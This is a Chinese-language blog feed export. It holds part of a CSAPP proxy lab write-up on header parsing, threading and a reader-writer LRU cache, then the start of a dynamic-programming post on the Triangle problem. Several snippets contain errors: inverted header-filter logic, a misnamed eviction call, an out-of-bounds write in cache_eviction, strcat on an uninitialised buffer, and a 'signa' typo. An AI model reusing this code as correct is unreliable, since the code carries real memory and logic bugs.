class="keyword">while</span> (Rio_readlineb(client_rio, buf, MAXLINE) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buf, endof_hdr) == <span class="number">0</span>) <span class="keyword">break</span>; <span class="comment">/*结束行*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!strncasecmp(buf, host_key, <span class="built_in">strlen</span>(host_key)))<span class="comment">/*Host:*/</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(host_hdr, buf);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!strncasecmp(buf, connection_key, <span class="built_in">strlen</span>(connection_key))</span><br><span class="line">            &amp;&amp; !strncasecmp(buf, proxy_connection_key, <span class="built_in">strlen</span>(proxy_connection_key))</span><br><span class="line">            &amp;&amp; !strncasecmp(buf, user_agent_key, <span class="built_in">strlen</span>(user_agent_key))) &#123;</span><br><span class="line">            <span class="built_in">strcat</span>(other_hdr, buf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(host_hdr) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(host_hdr, host_hdr_format, hostname);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 所有连在一起构成完整的header</span></span><br><span class="line">    <span class="built_in">sprintf</span>(http_header, <span class="string">"%s%s%s%s%s%s%s"</span>,</span><br><span class="line">            request_hdr,</span><br><span class="line">            host_hdr,</span><br><span class="line">            conn_hdr,</span><br><span class="line">            prox_hdr,</span><br><span class="line">            user_agent_hdr,</span><br><span class="line">            other_hdr,</span><br><span class="line">            endof_hdr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="对于socket的一些理解"><a href="#对于socket的一些理解" class="headerlink" title="对于socket的一些理解"></a>对于socket的一些理解</h2><blockquote>
<p>socket就是一个ipaddress:port对</p>
</blockquote>
<p>对于内核来说，socket就是通信的一个endpoint<br>而对于应用来说，socket是一个文件描述符(stdin stdout也是文件描述符)，因为在Unix系统里一切外设都是文件，网络也不例外，<strong>客户端和服务器在网络上通信就是通过读写对应的描述符来完成的</strong>。</p>
<p><img src="/images/CSAPP/socket.JPG" alt="socket"></p>
<p>看这张图，左边client(一个应用)想要与服务器通信的时候，首先需要通过<code>open_clientfd</code>创建一个socket描述符，然后通过<code>Rio_readinitb(&amp;rio,clientfd)</code> 将这个描述符封装起来, 我去csapp.c中看了下rio_readinitb的源代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rio_readinitb</span><span class="params">(<span class="keyword">rio_t</span> *rp, <span class="keyword">int</span> fd)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    rp-&gt;rio_fd = fd;  </span><br><span class="line">    rp-&gt;rio_cnt = <span class="number">0</span>;  </span><br><span class="line">    rp-&gt;rio_bufptr = rp-&gt;rio_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>完成创建和绑定之后便可以实现读写操作</p>
<ul>
<li>读: <code>Rio_readlineb(&amp;rio, buf, MAXLINE);</code> </li>
<li>写: <code>Rio_writen(clientfd, buf, strlen(buf));</code></li>
</ul>
<p>注意这里读操作要读<code>&amp;rio</code>，而写操作要写<code>clientfd</code> , <code>rio</code> 本质上还是一个clientfd，唯一的区别就是rio是robust的，所以我们在读的时候采取更robust的方式（防止输入的长度超过了我们buf可以存放的长度）。 服务器端也是一样。</p>
<h1 id="Level2-Multiple-Concurrent-Requests"><a href="#Level2-Multiple-Concurrent-Requests" class="headerlink" title="Level2: Multiple Concurrent Requests"></a>Level2: Multiple Concurrent Requests</h1><p>第二部分要求我们的proxy服务器支持并行，从CSAPP课本的第12章我们学到了三种实现程序并行的方式</p>
<ol>
<li>基于进程: 用之前学到的Fork来实现，每建立一个连接就fork一个子进程来处理这个连接，需要回收僵尸进程已避免内存泄漏（因为proxy是要长期运行的进程)</li>
<li>基于事件: 维护一个 connection 数组，包含若干 <code>connfd</code>，每个输入请求都被当做事件，然后每次从已有的事件中选取一个进行处理</li>
<li>基于线程: 线程比进程要轻量级，线程切换的花销比较少，使用<code>pthread.h</code>函数库来实现。</li>
</ol>
<p>这里我们选用第三种-基于进程的方法来将我们的代理服务器改造成支持并发的服务器。 其实需要修改的地方不多，在main函数的while循环中，每当我们建立一个新的连接(accpet函数)， 就创建一个新的线程去完成这个doit的任务即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * connfd;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">	clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">	connfd = Malloc(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	*connfd = Accept(listenfd, (SA*) &amp;clientaddr, &amp;clientlen);</span><br><span class="line">	<span class="comment">// 当pthread_create函数返回时候 主线程和新创建的对等线程同时在运行</span></span><br><span class="line">	Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, connfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中thread是我们的线程例程，它以一个通用指针作为输入，如果想要传递多个参数给线程例程则应该将参数放到一个结构体中，然后传递结构体的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> connfd = *((<span class="keyword">int</span> *) vargp);</span><br><span class="line">	Pthread_detach(pthread_self());</span><br><span class="line">	Free(vargp);</span><br><span class="line">	doit(connfd);</span><br><span class="line">	Close(connfd);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>pthread_detach()</code>的作用是: 任意时刻，线程都是joinable的或者detached的，二者的区别在于detached thread在执行完毕后会自动释放自己所占用的资源，而joinable thread则会一直占用自己的资源直到有别的线程调用了<code>pthread_join()</code>并以自己的id作为参数了。所以这里为了防止内存泄露，使用了<code>pthread_detach(pthread_self())</code></p>
<p>这里还存在一个问题是，在main函数中为什么我们不直接将connfd作为参数传入到Pthread_create中呢，而是先动态分配一个地址，再将这个地址作为connfd呢？ </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> connfd;</span><br><span class="line">connfd = Accept(listenfd, (SA*) &amp;clientaddr, &amp;clientlen);</span><br><span class="line">Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, &amp;connfd);</span><br></pre></td></tr></table></figure>
<p>其原因就在于这种写法在<strong>对等线程的赋值语语句 int connfd = <em>((int </em>) vargp)</strong>和<strong>主线程的accept语句</strong>之间引入了竞争。如果复制语句在下一个accept之前完成，那一切都是正常的，如果赋值语句在accept之后完成，则对等线程中的局部变量connfd就得到了下一次连接的描述符值，就有可能出现两个线程在同一个描述符上进行输入输出了。所以我们必须将每个accept返回的已连接描述符分配到这个线程自己动态分配的存储器块中。</p>
<h1 id="Level3-Caching-Web-Objects"><a href="#Level3-Caching-Web-Objects" class="headerlink" title="Level3: Caching Web Objects"></a>Level3: Caching Web Objects</h1><p>对于缓存，必须是线程安全的，多个线程可以同时访问缓存，而只有一个线程可以写缓存。实际上这是一个读者-写者问题。<br>这里我的实现是读者优先的，只有在没有读者存在的情况下写着才能去写。具体实现:</p>
<h2 id="Cache定义"><a href="#Cache定义" class="headerlink" title="Cache定义"></a>Cache定义</h2><p>对于缓存的每一项，都有一个wmutex用来保护对buf和url（临界区）的读写，一个rdcntMutex来保护readcnt的读写。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAX_OBJECT_SIZE];</span><br><span class="line">    <span class="keyword">char</span> url[MAXLINE]; <span class="comment">// 用url作为key</span></span><br><span class="line">    <span class="keyword">int</span> LRU;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> readCNT;</span><br><span class="line">    <span class="keyword">sem_t</span> wmutex;     <span class="comment">// 保护buf的信号量 初始化为1</span></span><br><span class="line">    <span class="keyword">sem_t</span> rdcntMutex; <span class="comment">// 保护readCNT的信号量 初始化为1   </span></span><br><span class="line">&#125; cache_block;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    cache_block cacheobjs[MAX_CACHE_BLOCK];</span><br><span class="line">    <span class="keyword">int</span> block_num;</span><br><span class="line">&#125; Cache;</span><br><span class="line">Cache cache;</span><br></pre></td></tr></table></figure></p>
<p>全局变量<code>cache</code>就是我们在程序中要用的缓存区，它包含了<code>MAX_CACHE_BLOCK</code>项缓存项，这个数是通过<code>MAX_CACHE_SIZE</code>和<code>MAX_OBJECT_SIZE</code>得来的。</p>
<p>在我们读写cache_block之前，需要对信号量进行加锁操作，具体的实现为:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readerPrev</span><span class="params">(cache_block *bk)</span> </span>&#123;</span><br><span class="line">    P(&amp;bk-&gt;rdcntMutex);   <span class="comment">/* 修改readCNT前后都需要加锁解锁 以防止出现意外结果 */</span></span><br><span class="line">    bk-&gt;readCNT++;</span><br><span class="line">    <span class="keyword">if</span> (bk-&gt;readCNT == <span class="number">1</span>) <span class="comment">/* First in 如果我是第一个读者，则需要占用wmutex*/</span></span><br><span class="line">        P(&amp;bk-&gt;wmutex);</span><br><span class="line">    V(&amp;bk-&gt;rdcntMutex);	<span class="comment">// 多个读者可以一起读</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readerAfter</span><span class="params">(cache_block *bk)</span> </span>&#123;</span><br><span class="line">    P(&amp;bk-&gt;rdcntMutex);</span><br><span class="line">    bk-&gt;readCNT--;</span><br><span class="line">    <span class="keyword">if</span> (bk-&gt;readCNT == <span class="number">0</span>) <span class="comment">/*Last out 如果我是最后一个读者 则需释放wmutex*/</span></span><br><span class="line">        V(&amp;bk-&gt;wmutex);</span><br><span class="line">    V(&amp;bk-&gt;rdcntMutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writerPrev</span><span class="params">(cache_block *bk)</span> </span>&#123;</span><br><span class="line">    P(&amp;bk-&gt;wmutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writerAfter</span><span class="params">(cache_block *bk)</span> </span>&#123;</span><br><span class="line">    V(&amp;bk-&gt;wmutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cache-init"><a href="#cache-init" class="headerlink" title="cache_init"></a>cache_init</h2><p>初始化cache，要初试化cache中每一项cache_block的信号量和成员变量。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cache_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    cache.block_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_CACHE_BLOCK; i++) &#123;</span><br><span class="line">        Sem_init(&amp;(cache.cacheobjs[i].wmutex), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        Sem_init(&amp;(cache.cacheobjs[i].rdcntMutex), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        cache.cacheobjs[i].LRU = <span class="number">0</span>;</span><br><span class="line">        cache.cacheobjs[i].readCNT = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cache-search"><a href="#cache-search" class="headerlink" title="cache_search"></a>cache_search</h2><p>当我们的代理服务器想要从服务器上获取资源的时候，首先会查看自己是否缓存了这个资源，如果能找到则直接返回缓存的内容即可。所以这里需要一个<code>cache_search</code>函数来帮我们寻找某一url对应的资源。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_search</span><span class="params">(<span class="keyword">char</span> *url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache.block_num; i++) &#123;</span><br><span class="line">        readerPrev(&amp;(cache.cacheobjs[i]));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\ncache[%d]: %s"</span>, i, cache.cacheobjs[i].url);</span><br><span class="line">        <span class="keyword">if</span> (strcasecmp(url, cache.cacheobjs[i].url) == <span class="number">0</span>) &#123;</span><br><span class="line">            cache.cacheobjs[i].LRU++;</span><br><span class="line">            readerAfter(&amp;(cache.cacheobjs[i])); <span class="comment">// 返回之前必须要先释放啊！</span></span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        readerAfter(&amp;(cache.cacheobjs[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cache-insert"><a href="#cache-insert" class="headerlink" title="cache_insert"></a>cache_insert</h2><p>当程序刚开始时，我们需要插入新的缓存项，在修改cache_block前后需要调用<code>writerPrev</code>和<code>writeAfter</code>进行加锁和解锁。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cache_insert</span><span class="params">(<span class="keyword">char</span> *url, <span class="keyword">char</span> *buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(url) &gt; MAXLINE || <span class="built_in">strlen</span>(buf) &gt; MAX_OBJECT_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cache.block_num == MAX_CACHE_BLOCK) &#123;</span><br><span class="line">        cache_conviction(url, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i = cache.block_num;</span><br><span class="line">        cache.block_num++;</span><br><span class="line">        writerPrev(&amp;(cache.cacheobjs[i]));</span><br><span class="line">        <span class="built_in">strncpy</span>(cache.cacheobjs[i].url, url, <span class="built_in">strlen</span>(url));</span><br><span class="line">        cache.cacheobjs[i].url[<span class="built_in">strlen</span>(url)] = <span class="string">'\0'</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(cache.cacheobjs[i].buf, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">        cache.cacheobjs[i].buf[<span class="built_in">strlen</span>(buf)] = <span class="string">'\0'</span>;</span><br><span class="line">        cache.cacheobjs[i].LRU = <span class="number">0</span>;</span><br><span class="line">        cache.cacheobjs[i].readCNT = <span class="number">0</span>;</span><br><span class="line">        writerAfter(&amp;(cache.cacheobjs[i]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cache-eviction"><a href="#cache-eviction" class="headerlink" title="cache_eviction"></a>cache_eviction</h2><p>当cache中满了又有新的http object需要存入的时候，我们就需要用LRU法则找到一个最远使用过的项目，将其替换为新的http请求的内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cache_eviction</span><span class="params">(<span class="keyword">char</span> *url, <span class="keyword">char</span> *buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> min = <span class="number">9999</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache.block_num; i++) &#123;</span><br><span class="line">        readerPrev(&amp;(cache.cacheobjs[i]));</span><br><span class="line">        <span class="keyword">if</span> (cache.cacheobjs[i].LRU &lt; min) &#123;</span><br><span class="line">            min = cache.cacheobjs[i].LRU;</span><br><span class="line">            index = i;</span><br><span class="line">        &#125;</span><br><span class="line">        readerAfter(&amp;(cache.cacheobjs[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>) index = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 更新第i个的内容</span></span><br><span class="line">    writerPrev(&amp;(cache.cacheobjs[i]));</span><br><span class="line">    <span class="built_in">strncpy</span>(cache.cacheobjs[i].url, url, <span class="built_in">strlen</span>(url));</span><br><span class="line">    cache.cacheobjs[i].url[<span class="built_in">strlen</span>(url)] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(cache.cacheobjs[i].buf, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    cache.cacheobjs[i].buf[<span class="built_in">strlen</span>(buf)] = <span class="string">'\0'</span>;</span><br><span class="line">    cache.cacheobjs[i].LRU = <span class="number">0</span>;</span><br><span class="line">    cache.cacheobjs[i].readCNT = <span class="number">0</span>;</span><br><span class="line">    writerAfter(&amp;(cache.cacheobjs[i]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里并没有实现真实的LRU，而是通过cache_block中的一个字段LRU来判断的，每当读或者写一个缓存项的时候，都会给它的LRU加一，运行一段时间后LRU最小的一般就是最长时间没访问过的元素（也有可能出现重复，这样就不是严格的LRU了）。</p>
<h2 id="Using-Cache"><a href="#Using-Cache" class="headerlink" title="Using Cache"></a>Using Cache</h2><p>实现了cache的相关操作之后，我们在level2代码的基础上稍加修改就可以实现功能了。<br>首先在doit函数中，我们加入以下代码，使得在proxy与服务器建立通信之前先检查自己是否有缓存过这个url请求。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ind; <span class="comment">// TODO 如果cache中缓存过这个uri，则直接返回结果</span></span><br><span class="line"><span class="keyword">if</span> ((ind = cache_search(uri)) != <span class="number">-1</span>) &#123;</span><br><span class="line">    readerPrev(&amp;(cache.cacheobjs[ind]));</span><br><span class="line">    Rio_writen(connfd, cache.cacheobjs[ind].buf, <span class="built_in">strlen</span>(cache.cacheobjs[ind].buf));</span><br><span class="line">    readerAfter(&amp;(cache.cacheobjs[ind]));</span><br><span class="line">    writerPrev(&amp;(cache.cacheobjs[ind]));</span><br><span class="line">    cache.cacheobjs[ind].LRU++;</span><br><span class="line">    writerAfter(&amp;(cache.cacheobjs[ind]));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>其次，在我们从服务器中获取到响应之后，会调用cache_insert函数来把它更新到cache中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> n;</span><br><span class="line"><span class="keyword">char</span> whole[MAX_OBJECT_SIZE];</span><br><span class="line"><span class="keyword">int</span> size_whole = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((n = Rio_readlineb(&amp;server_rio, buf, MAXLINE)) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"proxy received %d bytes,then send\n"</span>, (<span class="keyword">int</span>) n);</span><br><span class="line">    Rio_writen(connfd, buf, n);</span><br><span class="line">    size_whole += n;</span><br><span class="line">    <span class="keyword">if</span> (size_whole &lt; MAX_OBJECT_SIZE)</span><br><span class="line">        <span class="built_in">strcat</span>(whole, buf);</span><br><span class="line">&#125;</span><br><span class="line">cache_insert(uri_store, whole); <span class="comment">// 将结果插入到cache中</span></span><br><span class="line">Close(serverfd);</span><br></pre></td></tr></table></figure>
<h1 id="More"><a href="#More" class="headerlink" title="More"></a>More</h1><h2 id="signal-handlling"><a href="#signal-handlling" class="headerlink" title="signal handlling"></a>signal handlling</h2><p>除此之外实验指导书中还有一些别的要求，比如为了proxy的健壮性，需要我们忽视一些信号。 比如当我们向一个已经关闭的socket发送内容，就会得到SIGPIPE的信号，对于这个信号默认的处理方法是终止这个进程，所以我们需要通过以下语句来忽视这个信号<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signa(SIGPIPE, SIG_IGN);</span><br></pre></td></tr></table></figure></p>
<h2 id="reader-writer-lock"><a href="#reader-writer-lock" class="headerlink" title="reader/writer lock"></a>reader/writer lock</h2><p>对于读者-写者问题的实现其实在<code>pthread.h</code>中是有一些函数可以使用的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pthread.h&quot;</span><br><span class="line">int pthread_rwlock_destroy(pthread_rwlock_t *rwlock);</span><br><span class="line">int pthread_rwlock_init(pthread_rwlock_t *restrict rwlock,const pthread_rwlockattr_t *restrict attr);</span><br><span class="line"></span><br><span class="line">/* Apply a read lock */</span><br><span class="line">int pthread_rwlock_rdlock(pthread_rwlock_t *rwlock);</span><br><span class="line">int pthread_rwlock_tryrdlock(pthread_rwlock_t *rwlock);</span><br><span class="line"></span><br><span class="line">/* Apply a write lock */</span><br><span class="line">int pthread_rwlock_wrlock(pthread_rwlock_t *rwlock);</span><br><span class="line">int pthread_rwlock_trywrlock(pthread_rwlock_t *rwlock);</span><br><span class="line"></span><br><span class="line">/* releases a lock held on the read-write lock object referenced by rwlock. */</span><br><span class="line">int pthread_rwlock_unlock(pthread_rwlock_t *rwlock);</span><br></pre></td></tr></table></figure>
<p>这里的<code>wrlock</code>和<code>trywrlock</code>实际上是非常有用的一对组合。当我们从缓存中读取内容时，需要更新时间戳（在上面的代码中就是LRU)，如果我们使用trywrlock 来保证我们修改时间戳的过程，那这个函数不会阻塞并等着共享资源的释放，而是会直接返回。 因为我们并没有要求严格的LRU规则，所以我们完全跳过这次的更新直接返回。</p>
<p>具体的文档可以看<a href="https://docs.oracle.com/cd/E19455-01/806-5257/6je9h032u/index.html" target="_blank" rel="noopener">这里</a></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li><a href="http://zablog.me/2015/12/08/ICS_Socket/" target="_blank" rel="noopener">Socket的一些Guide</a></li>
<li><a href="https://github.com/Ethan-Yan27/CSAPP-Labs/blob/master/yzf-proxylab-handout-3e/proxy%20(Part%201" target="_blank" rel="noopener">Ethan-Yan27</a>.c) </li>
</ol>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[九章-动态规划]]></title>
      <url>/2018/03/23/Algorithms/%E4%B9%9D%E7%AB%A0-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      <content type="html"><![CDATA[<p>九章最后一讲，动态规划。</p>
<a id="more"></a>
<h1 id="Intro-to-Dynamic-Programming"><a href="#Intro-to-Dynamic-Programming" class="headerlink" title="Intro to Dynamic Programming"></a>Intro to Dynamic Programming</h1><h2 id="一道例题Triangle"><a href="#一道例题Triangle" class="headerlink" title="一道例题Triangle"></a>一道例题<a href="http://www.lintcode.com/problem/triangle/" target="_blank" rel="noopener">Triangle</a></h2><p>给定一个数字三角形，找到从顶部到底部的最小路径和，每一步可以移动到下面一行的相邻数字上。 我们用不同的解法来做一下这道题</p>
<h3 id="DFS-Traverse"><a href="#DFS-Traverse" class="headerlink" title="DFS: Traverse"></a>DFS: Traverse</h3><p>可以发现这道题跟我们之前做过的二叉树的题目很像，我们可以尝试用traverse来做。在遍历的过程中维护一个全局变量best。时间复杂度为<code>O(2^n)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">traverse</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> sum)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x == n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum &lt; best)&#123;</span><br><span class="line">            best = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    traverse(x + <span class="number">1</span>, y, sum + A[x][y]);</span><br><span class="line">    traverse(x + <span class="number">1</span>, y + <span class="number">1</span>, sum + A[x][y]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="DFS-Divide-and-Conquer"><a href="#DFS-Divide-and-Conquer" class="headerlink" title="DFS: Divide and Conquer"></a>DFS: Divide and Conquer</h3><p>用分治法，时间复杂度依然为<code>O(2 ^ n)</code></p>
